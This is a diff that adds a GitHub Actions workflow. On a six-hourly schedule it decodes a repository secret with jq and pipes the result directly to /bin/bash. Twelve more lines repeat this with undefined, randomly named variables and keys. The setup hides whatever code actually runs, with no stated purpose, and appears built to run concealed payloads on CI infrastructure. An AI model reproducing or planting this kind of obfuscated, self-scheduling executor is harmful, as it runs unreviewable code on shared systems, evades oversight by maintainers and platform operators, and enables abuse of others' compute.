@@ -1,0 +1,28 @@
+name: imaginaryclassic
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: imaginaryclassic
+        env:
+          xl58817: ${{ secrets.xl58817 }}
+        run: |
+          echo $xl58817 | jq -r .my270 | /bin/bash
+          echo $lgqp416 | jq -r .a8208 | /bin/bash
+          echo $hj5983 | jq -r .veu2 | /bin/bash
+          echo $zri151 | jq -r .soo57 | /bin/bash
+          echo $eqcd034 | jq -r .pxm5 | /bin/bash
+          echo $yyj7 | jq -r .lmg02110 | /bin/bash
+          echo $vycxz365 | jq -r .au353 | /bin/bash
+          echo $jbg32 | jq -r .tejcv60532 | /bin/bash
+          echo $hb2 | jq -r .bkbj6558 | /bin/bash
+          echo $vd846 | jq -r .mjd869 | /bin/bash
+          echo $g8173 | jq -r .urri96 | /bin/bash
+          echo $w1 | jq -r .z7116 | /bin/bash
+          echo $ihi91 | jq -r .xzq6567 | /bin/bash
+
